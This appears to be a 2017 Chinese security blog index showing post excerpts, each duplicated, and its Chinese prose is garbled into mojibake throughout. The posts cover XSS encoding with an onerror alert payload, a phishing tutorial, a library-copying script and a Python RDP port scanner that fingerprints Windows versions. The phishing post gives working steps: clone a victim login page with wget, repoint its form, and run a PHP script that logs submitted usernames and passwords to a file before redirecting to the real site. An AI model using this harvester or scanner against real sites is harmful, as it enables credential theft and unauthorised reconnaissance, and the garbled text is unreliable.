<p><code>&lt;button type=&quot;submit&quot; onclick=&quot;x=&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;;document.write(HtmlEncode(x))&quot;&gt;xsstest&lt;/button&gt;</code></p>
<p>ä¸¢åˆ°test.htmlé‡Œé¢ï¼Œä½¿ç”¨æµè§ˆå™¨æ‰“å¼€è¿˜æ˜¯åŸæ ·ã€‚</p>
<p>æ‰€ä»¥xsså­˜åœ¨çš„æ­¥éª¤æ¥è¯´æ˜¯è¿™æ ·çš„ï¼š<br><code>ä»£ç --&gt; æµè§ˆå™¨æ‰§è¡Œ --&gt; xss</code></p>
<p>æµè§ˆå™¨è§£é‡Šäº†å…¶ä¸­çš„ä»£ç å±•ç°ç»™äººçœ‹ã€‚</p>
<p>HTMLçš„è‡ªåŠ¨è§£ç æ˜¯åœ¨æ‰§è¡Œjsä»£ç ä¹‹å‰ï¼Œå¹¶ä¸”<code>on*</code>äº‹ä»¶å†…å¯ä»¥æ‰§è¡Œjsè„šæœ¬ï¼Œå³ <strong>htmlè§£ç ä¹‹åæ‰å¯ä»¥æ‰§è¡Œjs</strong>ã€‚</p>
	

	</div>
  <a type="button" href="/2017/04/12/xss-encode2.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<ul>
<li><a href="http://jkme.github.io/xss-encode-decode.html">http://jkme.github.io/xss-encode-decode.html</a></li>
<li><a target="_blank" rel="noopener" href="http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html">http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html</a></li>
</ul>
<p>åœ¨å‰é¢æ–‡ç« é‡Œé¢xssçš„ç¼–ç æåˆ°è¿‡è¿™ä¸ªä¸œè¥¿: </p>
<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
1. HTML Decoding
2. URL Decoding
3. Javascript Decoding

http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<strong>HTMLæ ‡ç­¾é‡Œé¢</strong>ï¼Œjsä¹‹è¡Œä¹‹å‰ï¼Œhtmlå½¢å¼çš„ç¼–ç ä¼šè‡ªåŠ¨decodeã€‚</p>
<p>è§£é‡Šï¼š</p>
<p><code>&lt;button type=&quot;submit&quot; onclick=&quot;x=&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;;document.write(HtmlEncode(x))&quot;&gt;xsstest&lt;/button&gt;</code></p>
<p>ä¸¢åˆ°test.htmlé‡Œé¢ï¼Œä½¿ç”¨æµè§ˆå™¨æ‰“å¼€è¿˜æ˜¯åŸæ ·ã€‚</p>
<p>æ‰€ä»¥xsså­˜åœ¨çš„æ­¥éª¤æ¥è¯´æ˜¯è¿™æ ·çš„ï¼š<br><code>ä»£ç --&gt; æµè§ˆå™¨æ‰§è¡Œ --&gt; xss</code></p>
<p>æµè§ˆå™¨è§£é‡Šäº†å…¶ä¸­çš„ä»£ç å±•ç°ç»™äººçœ‹ã€‚</p>
<p>HTMLçš„è‡ªåŠ¨è§£ç æ˜¯åœ¨æ‰§è¡Œjsä»£ç ä¹‹å‰ï¼Œå¹¶ä¸”<code>on*</code>äº‹ä»¶å†…å¯ä»¥æ‰§è¡Œjsè„šæœ¬ï¼Œå³ <strong>htmlè§£ç ä¹‹åæ‰å¯ä»¥æ‰§è¡Œjs</strong>ã€‚</p>
	
	</div>
  <a type="button" href="/2017/04/12/xss-encode2.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/04/01/how-to-fish.html" >How To Fishing</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-04-01  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>[XSSé’“é±¼æ¨¡æ‹Ÿå®æˆ˜]<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
</blockquote>
<h3 id="å‰ç½®å‡†å¤‡"><a href="#å‰ç½®å‡†å¤‡" class="headerlink" title="å‰ç½®å‡†å¤‡"></a>å‰ç½®å‡†å¤‡</h3><pre class="line-numbers language-none"><code class="language-none">ç›®æ ‡ç™»å½•é¡µé¢: login.html
å‡çš„ç™»å½•é¡µé¢: fake.html
ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€: deal.php
fish.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<h3 id="é’“é±¼æ­¥éª¤"><a href="#é’“é±¼æ­¥éª¤" class="headerlink" title="é’“é±¼æ­¥éª¤"></a>é’“é±¼æ­¥éª¤</h3><ul>
<li>å…ˆä¸‹è½½ç›®æ ‡login.htmlï¼Œä¿å­˜ä¸ºfake.html: <code>wget -r -p -np -k ç½‘ç«™åœ°å€</code></li>
</ul>
<p>ç„¶åæ›¿æ¢æ‰ç™»å½•æ—¶å€™çš„POSTç›®æ ‡åœ°å€ï¼Œæ¯”å¦‚<code>&lt;form action=&quot;http://normal.com/login.php&quot; method=&quot;post&quot;&gt;</code>ï¼Œæ›¿æ¢æ‰è‡ªå·±çš„deal.phpé¡µé¢ã€‚</p>
<p>æ³¨æ„äº‹é¡¹: é¡µé¢ä¸­æœ‰éƒ¨åˆ†jsæˆ–è€…cssä¸æ˜¯ç»å¯¹è·¯å¾„ï¼Œè¦æ›¿æ¢ä¸ºç»å¯¹è·¯å¾„ï¼Œæœ€å¥½ç›´æ¥ä½¿ç”¨wgetä¸‹è½½login.html</p>
<ul>
<li>ç„¶åå†æœåŠ¡å™¨ä¸Šæ„é€ ä¸€ä¸ªdeal.php</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
$user &#x3D; $_POST[&#39;username&#39;];
$pass &#x3D; $_POST[&#39;password&#39;];
$f &#x3D; fopen(&#39;pass.txt&#39;,&#39;a&#39;);
fwrite($f, &quot;User:&quot;.$user.&quot;Pass:&quot;.$pass.&quot;\n&quot;);
fclose($f);
header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x2F;è·³è½¬åˆ°æ­£å¸¸çš„åå°
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>è¿˜å·®ä¸€ä¸ªjs</li>
</ul>
	

	</div>
  <a type="button" href="/2017/04/01/how-to-fish.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>[XSSé’“é±¼æ¨¡æ‹Ÿå®æˆ˜]<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
</blockquote>
<h3 id="å‰ç½®å‡†å¤‡"><a href="#å‰ç½®å‡†å¤‡" class="headerlink" title="å‰ç½®å‡†å¤‡"></a>å‰ç½®å‡†å¤‡</h3><pre class="line-numbers language-none"><code class="language-none">ç›®æ ‡ç™»å½•é¡µé¢: login.html
å‡çš„ç™»å½•é¡µé¢: fake.html
ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€: deal.php
fish.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<h3 id="é’“é±¼æ­¥éª¤"><a href="#é’“é±¼æ­¥éª¤" class="headerlink" title="é’“é±¼æ­¥éª¤"></a>é’“é±¼æ­¥éª¤</h3><ul>
<li>å…ˆä¸‹è½½ç›®æ ‡login.htmlï¼Œä¿å­˜ä¸ºfake.html: <code>wget -r -p -np -k ç½‘ç«™åœ°å€</code></li>
</ul>
<p>ç„¶åæ›¿æ¢æ‰ç™»å½•æ—¶å€™çš„POSTç›®æ ‡åœ°å€ï¼Œæ¯”å¦‚<code>&lt;form action=&quot;http://normal.com/login.php&quot; method=&quot;post&quot;&gt;</code>ï¼Œæ›¿æ¢æ‰è‡ªå·±çš„deal.phpé¡µé¢ã€‚</p>
<p>æ³¨æ„äº‹é¡¹: é¡µé¢ä¸­æœ‰éƒ¨åˆ†jsæˆ–è€…cssä¸æ˜¯ç»å¯¹è·¯å¾„ï¼Œè¦æ›¿æ¢ä¸ºç»å¯¹è·¯å¾„ï¼Œæœ€å¥½ç›´æ¥ä½¿ç”¨wgetä¸‹è½½login.html</p>
<ul>
<li>ç„¶åå†æœåŠ¡å™¨ä¸Šæ„é€ ä¸€ä¸ªdeal.php</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
$user &#x3D; $_POST[&#39;username&#39;];
$pass &#x3D; $_POST[&#39;password&#39;];
$f &#x3D; fopen(&#39;pass.txt&#39;,&#39;a&#39;);
fwrite($f, &quot;User:&quot;.$user.&quot;Pass:&quot;.$pass.&quot;\n&quot;);
fclose($f);
header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x2F;è·³è½¬åˆ°æ­£å¸¸çš„åå°
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>è¿˜å·®ä¸€ä¸ªjs</li>
</ul>
	
	</div>
  <a type="button" href="/2017/04/01/how-to-fish.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/03/09/copy-shared-lib.html" >Linuxå¤åˆ¶å¸¦åŠ¨æ€åº“çš„å‘½ä»¤</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-03-09  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>éœ€æ±‚ï¼š ä»ä¸€å°Linuxå¤åˆ¶å‘½ä»¤åˆ°å¦å¤–ä¸€å°ä¸Šé¢ï¼Œç”±äºå‘½ä»¤ä¾èµ–åŠ¨æ€åº“ï¼Œæ¯”å¦‚gcc:</p>
<pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;
	linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)
	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)
	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™ç§æƒ…å†µä¸‹å•å•å¤åˆ¶gccæ²¡åµç”¨ï¼Œgoogleäº†ä¸‹æ‰¾åˆ°æŸä¸ªbashè„šæœ¬:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash

if [ $# !&#x3D; 2 ] ; then
    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;
    exit 1
fi

PATH_TO_BINARY&#x3D;&quot;$1&quot;
TARGET_FOLDER&#x3D;&quot;$2&quot;

# if we cannot find the the binary we have to abort
if [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then
    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;
    exit 1
fi

# copy the binary to the target folder
# create directories if required
echo &quot;---&gt; copy binary itself&quot;
cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;

# copy the required shared libs to the target folder
# create directories if required
echo &quot;---&gt; copy libraries&quot;
for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do
   if [ -f &quot;$lib&quot; ] ; then
        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;
   fi  
done

# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.
# however, I&#39;ve not tested that yet
# create lib64 - if required and link the content from lib to it
if [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then
    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;
fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”¨æ³•: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li>
</ul>

	

	</div>
  <a type="button" href="/2017/03/09/copy-shared-lib.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>éœ€æ±‚ï¼š ä»ä¸€å°Linuxå¤åˆ¶å‘½ä»¤åˆ°å¦å¤–ä¸€å°ä¸Šé¢ï¼Œç”±äºå‘½ä»¤ä¾èµ–åŠ¨æ€åº“ï¼Œæ¯”å¦‚gcc:</p>
<pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;
	linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)
	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)
	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™ç§æƒ…å†µä¸‹å•å•å¤åˆ¶gccæ²¡åµç”¨ï¼Œgoogleäº†ä¸‹æ‰¾åˆ°æŸä¸ªbashè„šæœ¬:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash

if [ $# !&#x3D; 2 ] ; then
    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;
    exit 1
fi

PATH_TO_BINARY&#x3D;&quot;$1&quot;
TARGET_FOLDER&#x3D;&quot;$2&quot;

# if we cannot find the the binary we have to abort
if [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then
    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;
    exit 1
fi

# copy the binary to the target folder
# create directories if required
echo &quot;---&gt; copy binary itself&quot;
cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;

# copy the required shared libs to the target folder
# create directories if required
echo &quot;---&gt; copy libraries&quot;
for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do
   if [ -f &quot;$lib&quot; ] ; then
        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;
   fi  
done

# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.
# however, I&#39;ve not tested that yet
# create lib64 - if required and link the content from lib to it
if [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then
    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;
fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”¨æ³•: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li>
</ul>

	
	</div>
  <a type="button" href="/2017/03/09/copy-shared-lib.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/03/02/xss-encode-decode.html" >xssåŸºç¡€ç¼–ç </a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-03-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>htmlçš„å®ä½“ç¼–ç ï¼Œæ¯”å¦‚åè¿›åˆ¶ç¼–ç å’Œåå…­è¿›åˆ¶ç¼–ç ï¼Œéœ€è¦æ”¾åœ¨htmlæ ‡ç­¾é‡Œé¢ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
1. HTML Decoding
2. URL Decoding
3. Javascript Decoding

http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸‰ç§ç¼–ç ï¼Œå¯¹äºhtmlæ¥è¯´æ˜¯(10è¿›åˆ¶å’Œ16è¿›åˆ¶ï¼‰</p>
<h3 id="htmlå°–æ‹¬å·"><a href="#htmlå°–æ‹¬å·" class="headerlink" title="htmlå°–æ‹¬å·"></a>htmlå°–æ‹¬å·</h3><ul>
<li>åè¿›åˆ¶ï¼š<code>&amp;#60;</code> </li>
<li>htmlåå…­: <code>&amp;#x3c;</code></li>
</ul>
<h3 id="javascriptçš„å…«è¿›åˆ¶å’Œ16è¿›åˆ¶ä»¥åŠunicodeç¼–ç "><a href="#javascriptçš„å…«è¿›åˆ¶å’Œ16è¿›åˆ¶ä»¥åŠunicodeç¼–ç " class="headerlink" title="javascriptçš„å…«è¿›åˆ¶å’Œ16è¿›åˆ¶ä»¥åŠunicodeç¼–ç :"></a>javascriptçš„å…«è¿›åˆ¶å’Œ16è¿›åˆ¶ä»¥åŠunicodeç¼–ç :</h3><p>å°–æ‹¬å·ï¼ï¼&gt; </p>
<ul>
<li>å…«è¿›åˆ¶:<code>\74</code> </li>
<li>åå…­è¿›åˆ¶: <code>\x3c</code></li>
<li>unicodeç¼–ç : <code>\u003c</code></li>
</ul>
<h3 id="urlç¼–ç åŠbase64ç¼–ç -lt"><a href="#urlç¼–ç åŠbase64ç¼–ç -lt" class="headerlink" title="urlç¼–ç åŠbase64ç¼–ç (&lt;)"></a>urlç¼–ç åŠbase64ç¼–ç (&lt;)</h3><ul>
<li>url: %3C </li>
<li>base64: PA==</li>
</ul>
	

	</div>
  <a type="button" href="/2017/03/02/xss-encode-decode.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>htmlçš„å®ä½“ç¼–ç ï¼Œæ¯”å¦‚åè¿›åˆ¶ç¼–ç å’Œåå…­è¿›åˆ¶ç¼–ç ï¼Œéœ€è¦æ”¾åœ¨htmlæ ‡ç­¾é‡Œé¢ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
1. HTML Decoding
2. URL Decoding
3. Javascript Decoding

http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸‰ç§ç¼–ç ï¼Œå¯¹äºhtmlæ¥è¯´æ˜¯(10è¿›åˆ¶å’Œ16è¿›åˆ¶ï¼‰</p>
<h3 id="htmlå°–æ‹¬å·"><a href="#htmlå°–æ‹¬å·" class="headerlink" title="htmlå°–æ‹¬å·"></a>htmlå°–æ‹¬å·</h3><ul>
<li>åè¿›åˆ¶ï¼š<code>&amp;#60;</code> </li>
<li>htmlåå…­: <code>&amp;#x3c;</code></li>
</ul>
<h3 id="javascriptçš„å…«è¿›åˆ¶å’Œ16è¿›åˆ¶ä»¥åŠunicodeç¼–ç "><a href="#javascriptçš„å…«è¿›åˆ¶å’Œ16è¿›åˆ¶ä»¥åŠunicodeç¼–ç " class="headerlink" title="javascriptçš„å…«è¿›åˆ¶å’Œ16è¿›åˆ¶ä»¥åŠunicodeç¼–ç :"></a>javascriptçš„å…«è¿›åˆ¶å’Œ16è¿›åˆ¶ä»¥åŠunicodeç¼–ç :</h3><p>å°–æ‹¬å·ï¼ï¼&gt; </p>
<ul>
<li>å…«è¿›åˆ¶:<code>\74</code> </li>
<li>åå…­è¿›åˆ¶: <code>\x3c</code></li>
<li>unicodeç¼–ç : <code>\u003c</code></li>
</ul>
<h3 id="urlç¼–ç åŠbase64ç¼–ç -lt"><a href="#urlç¼–ç åŠbase64ç¼–ç -lt" class="headerlink" title="urlç¼–ç åŠbase64ç¼–ç (&lt;)"></a>urlç¼–ç åŠbase64ç¼–ç (&lt;)</h3><ul>
<li>url: %3C </li>
<li>base64: PA==</li>
</ul>
	
	</div>
  <a type="button" href="/2017/03/02/xss-encode-decode.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/02/28/3389-scan.html" >3389æŒ‡çº¹æ‰«æ</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-02-28  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>nmapçš„æ‰«æåŸç†æ²¡æ€ä¹ˆæ¢ç´¢ï¼ŒåªçŸ¥é“ä½¿ç”¨nmapæ‰«æçš„æ—¶å€™ï¼Œç›®æ ‡æœåŠ¡å™¨æ‰«ä¸å‡ºæ¥ä¸œè¥¿ã€‚ç‰¹åœ°åˆ†æäº†ä¸‹3389è¿œç¨‹é“¾æ¥çš„è¿‡ç¨‹ã€‚ç®€å•æ¥è¯´æ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li>TCPä¸‰æ¬¡æ¡æ‰‹</li>
<li>å®¢æˆ·ç«¯å‘é€COTPåè®®</li>
<li>æœåŠ¡ç«¯å‘é€TPKT</li>
</ul>
<p>åŸæ¥æ˜¯ç”¨socketç¼–ç¨‹è¿™ä¹ˆç®€å•ï¼Œåªéœ€è¦æŠ“wiresharkï¼ŒæŠŠTCPçš„æ•°æ®å°è£…ä¸º16è¿›åˆ¶å‘é€å‡ºå»å°±è¡Œäº†ã€‚</p>
<p>æœ€åçš„pythonè„šæœ¬æ˜¯è¿™æ ·çš„ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
# coding: utf-8

import socket
import binascii
import sys
import threading
from Queue import Queue


def verify(sock, port):
	while 1:
		buff &#x3D; sock.recv(2048)
		if not buff:
			break
		b &#x3D; bytearray(buff)
		print &quot;[+] %s&quot; % binascii.hexlify(b)
		detect_os(binascii.hexlify(b), port)
		# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:
		# 	print &quot;[+] RDP Port is %s&quot; % port
		# 	sys.exit(0)


def detect_os(res, port):
	d &#x3D; &#123;
		&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,
		&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,
		&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,
		&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,
		&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,
		&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;
	&#125;
	for key, value in d.iteritems():
		if value &#x3D;&#x3D; res:
			print &quot;[+] Os May be: %s&quot; % key
			print &quot;[+] RDP Port is %s&quot; % port
			sys.exit(0)
def send_payload(sock):
	sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)


def worker():
	while not q.empty():
		port &#x3D; q.get()
		try:
			scan(port)
		finally:
			q.task_done()


def scan(port):
	try:
		s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(2)
		sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)
		sys.stdout.flush()
		if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:
			print &quot;[+] Connect Success %s&quot; % port
			send_payload(s)
			verify(s, port)
	except Exception, e:
		# raise e
		pass
	s.close()

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
	if len(sys.argv) !&#x3D; 2:
		print &quot;Usage: %s IP&quot; % sys.argv[0]
		sys.exit(0)
	ip &#x3D; sys.argv[1]
	q &#x3D; Queue()
	map(q.put, xrange(3300, 65535))
	threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]
	map(lambda x: x.start(), threads)
	q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


	

	</div>
  <a type="button" href="/2017/02/28/3389-scan.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>nmapçš„æ‰«æåŸç†æ²¡æ€ä¹ˆæ¢ç´¢ï¼ŒåªçŸ¥é“ä½¿ç”¨nmapæ‰«æçš„æ—¶å€™ï¼Œç›®æ ‡æœåŠ¡å™¨æ‰«ä¸å‡ºæ¥ä¸œè¥¿ã€‚ç‰¹åœ°åˆ†æäº†ä¸‹3389è¿œç¨‹é“¾æ¥çš„è¿‡ç¨‹ã€‚ç®€å•æ¥è¯´æ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li>TCPä¸‰æ¬¡æ¡æ‰‹</li>
<li>å®¢æˆ·ç«¯å‘é€COTPåè®®</li>
<li>æœåŠ¡ç«¯å‘é€TPKT</li>
</ul>
<p>åŸæ¥æ˜¯ç”¨socketç¼–ç¨‹è¿™ä¹ˆç®€å•ï¼Œåªéœ€è¦æŠ“wiresharkï¼ŒæŠŠTCPçš„æ•°æ®å°è£…ä¸º16è¿›åˆ¶å‘é€å‡ºå»å°±è¡Œäº†ã€‚</p>
<p>æœ€åçš„pythonè„šæœ¬æ˜¯è¿™æ ·çš„ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
# coding: utf-8

import socket
import binascii
import sys
import threading
from Queue import Queue


def verify(sock, port):
	while 1:
		buff &#x3D; sock.recv(2048)
		if not buff:
			break
		b &#x3D; bytearray(buff)
		print &quot;[+] %s&quot; % binascii.hexlify(b)
		detect_os(binascii.hexlify(b), port)
		# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:
		# 	print &quot;[+] RDP Port is %s&quot; % port
		# 	sys.exit(0)


def detect_os(res, port):
	d &#x3D; &#123;
		&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,
		&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,
		&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,
		&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,
		&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,
		&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;
	&#125;
	for key, value in d.iteritems():
		if value &#x3D;&#x3D; res:
			print &quot;[+] Os May be: %s&quot; % key
			print &quot;[+] RDP Port is %s&quot; % port
			sys.exit(0)
def send_payload(sock):
	sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)


def worker():
	while not q.empty():
		port &#x3D; q.get()
		try:
			scan(port)
		finally:
			q.task_done()


def scan(port):
	try:
		s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(2)
		sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)
		sys.stdout.flush()
		if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:
			print &quot;[+] Connect Success %s&quot; % port
			send_payload(s)
			verify(s, port)
	except Exception, e:
		# raise e
		pass
	s.close()

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
	if len(sys.argv) !&#x3D; 2:
		print &quot;Usage: %s IP&quot; % sys.argv[0]
		sys.exit(0)
	ip &#x3D; sys.argv[1]
	q &#x3D; Queue()
	map(q.put, xrange(3300, 65535))
	threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]
	map(lambda x: x.start(), threads)
	q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


	
	</div>
